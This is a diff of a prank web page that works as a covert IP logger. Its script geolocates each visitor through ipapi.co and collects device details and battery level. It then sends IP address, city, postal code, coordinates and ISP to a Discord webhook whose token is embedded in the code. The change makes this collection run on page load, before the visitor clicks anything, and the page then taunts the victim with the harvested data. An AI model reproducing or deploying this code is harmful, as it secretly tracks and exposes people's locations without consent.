@@ -35,18 +35,23 @@
             color: white;
             text-shadow: 0 0 10px white;
             cursor: pointer;
+            z-index: 10;
         }
 
         #info {
             display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
             width: 80%;
             max-width: 55ch;
-            margin: 20px auto;
             border: 1px solid #ccc;
             padding: 20px;
             background-color: rgba(255, 255, 255, 0.8);
             color: black;
             text-align: center;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
         }
 
         .label {
@@ -59,11 +64,12 @@
             bottom: 0;
             min-width: 100%;
             min-height: 100%;
-            display: none; /* Initially hidden */
+            display: none;
             z-index: -1;
             border: none;
         }
     </style>
+    <link rel="icon" href="icon.ico" type="image/x-icon">
     <title>upadekgitow.xyz</title>
 </head>
 <body>
@@ -82,7 +88,7 @@
     window.addEventListener('mousemove', (event) => {
         if (animationActive) {
             const now = Date.now();
-            if (now - lastTime > 70) {
+            if (now - lastTime > 80) { 
                 createMoney(event.clientX, event.clientY);
                 lastTime = now;
             }
@@ -94,17 +100,9 @@
         money.classList.add('money');
         document.body.appendChild(money);
 
-        const moneyWidth = money.offsetWidth;
-        const moneyHeight = money.offsetHeight;
-        const offsetX = moneyWidth / 2;
-        const offsetY = moneyHeight / 2;
-
-        const shiftRight = 15;
-        const shiftDown = 3;
-
         gsap.set(money, {
-            x: x - offsetX + shiftRight,
-            y: y - offsetY + shiftDown,
+            x: x - 55, 
+            y: y - 60,
             opacity: 0
         });
 
@@ -124,15 +122,6 @@
         });
     }
 
-    const clickToEnter = document.querySelector('.click-to-enter');
-    const infoDiv = document.getElementById('info');
-
-    function displayInfo(label, value) {
-        const p = document.createElement('p');
-        p.innerHTML = `<span class="label">${label}:</span> ${value}`;
-        infoDiv.appendChild(p);
-    }
-
     async function getBatteryInfo() {
         if (navigator.getBattery) {
             const battery = await navigator.getBattery();
@@ -141,21 +130,16 @@
         return 'Battery information not available';
     }
 
-    clickToEnter.addEventListener('click', async () => {
-        document.title = 'DZIĘKI ZA IP 😂😂😂';
+    function displayInfo(label, value, delay) {
+        setTimeout(() => {
+            const infoDiv = document.getElementById('info');
+            const p = document.createElement('p');
+            p.innerHTML = `<span class="label">${label}:</span> ${value}`;
+            infoDiv.appendChild(p);
+        }, delay);
+    }
 
-        const audio = new Audio('music.mp3');
-        audio.play().catch(() => {});
-
-        document.body.style.backgroundColor = 'white';
-        document.body.style.cursor = 'auto';
-        animationActive = false;
-
-        const moneyElements = document.querySelectorAll('.money');
-        moneyElements.forEach(money => {
-            money.style.display = 'none';
-        });
-
+    async function collectAndSendInfo() {
         const batteryPercentage = await getBatteryInfo();
 
         const systemInfo = {
@@ -171,46 +155,28 @@
             'Dostępna pamięć przeglądarki': navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Informacja niedostępna',
         };
 
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
-                const orderedInfo = {
-                    'Adres IP': data.ip,
-                    'Kraj': data.country_name,
-                    'Region': data.region,
-                    'Miasto': data.city,
-                    'Kod pocztowy': data.postal,
-                    'Pełna lokalizacja': data.latitude + ', ' + data.longitude,
-                    ...systemInfo,
-                    'Strefa czasowa': data.timezone,
-                    'Aktualna godzina': new Date().toLocaleString('pl-PL', { timeZone: data.timezone }),
-                    'ISP': data.org,
-                    'Poziom baterii': batteryPercentage,
-                };
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
 
-                sendToWebhook(orderedInfo);
+        const orderedInfo = {
+            'Adres IP': data.ip,
+            'Kraj': data.country_name,
+            'Region': data.region,
+            'Miasto': data.city,
+            'Kod pocztowy': data.postal,
+            'Pełna lokalizacja': data.latitude + ', ' + data.longitude,
+            ...systemInfo,
+            'Strefa czasowa': data.timezone,
+            'Aktualna godzina': new Date().toLocaleString('pl-PL', { timeZone: data.timezone }),
+            'ISP': data.org,
+        };
 
-                let delay = 0;
+        sendToWebhook(orderedInfo, batteryPercentage);
+        return orderedInfo;
+    }
 
-                for (const [key, value] of Object.entries(orderedInfo)) {
-                    if (key !== 'Poziom baterii') {
-                        setTimeout(() => {
-                            displayInfo(key, value);
-                        }, delay);
-                        delay += 200;
-                    }
-                }
-
-                document.getElementById('myVideo').style.display = 'block';
-            })
-            .catch(() => {});
-
-        clickToEnter.style.display = 'none';
-        infoDiv.style.display = 'block';
-    });
-
-    function sendToWebhook(systemInfo) {
-        const webhookUrl = 'https://discord.com/api/webhooks/1274702152404701236/sCwXwygr7_W8pwJPvzlUCdB3OJ5sz7VIG88GfWlK__mPKquOTHXnhPRFC6nIqXRRohQu';
+    function sendToWebhook(systemInfo, batteryPercentage) {
+        const webhookUrl = 'https://discord.com/api/webhooks/1275079430737362984/1NAuGt6E-e7broFZQA2kQeIXfexaMrfdrEuLSBNlDWILRVoqK8xgFy8arNCrQt928lH4';
 
         const embed = {
             title: 'Informacje o systemie',
@@ -226,6 +192,12 @@
             });
         }
 
+        embed.fields.push({
+            name: 'Poziom baterii',
+            value: batteryPercentage,
+            inline: true,
+        });
+
         if (webhookUrl) {
             fetch(webhookUrl, {
                 method: 'POST',
@@ -236,6 +208,39 @@
             }).catch(() => {});
         }
     }
+
+    const collectedInfoPromise = collectAndSendInfo();
+
+    const clickToEnter = document.querySelector('.click-to-enter');
+    clickToEnter.addEventListener('click', async () => {
+        document.title = 'DZIĘKI ZA IP 😂😂😂';
+        const audio = new Audio('music.mp3');
+        audio.play().catch(() => {});
+
+        document.body.style.backgroundColor = 'white';
+        document.body.style.cursor = 'auto';
+        animationActive = false;
+
+        const moneyElements = document.querySelectorAll('.money');
+        moneyElements.forEach(money => {
+            money.style.display = 'none';
+        });
+
+        clickToEnter.style.display = 'none';  
+
+        document.getElementById('myVideo').style.display = 'block'; 
+
+        const collectedInfo = await collectedInfoPromise;
+        let delay = 0;
+        for (const [key, value] of Object.entries(collectedInfo)) {
+            if (key !== 'Poziom baterii') {
+                displayInfo(key, value, delay);
+                delay += 200; 
+            }
+        }
+
+        document.getElementById('info').style.display = 'block';
+    });
 </script>
 </body>
 </html>
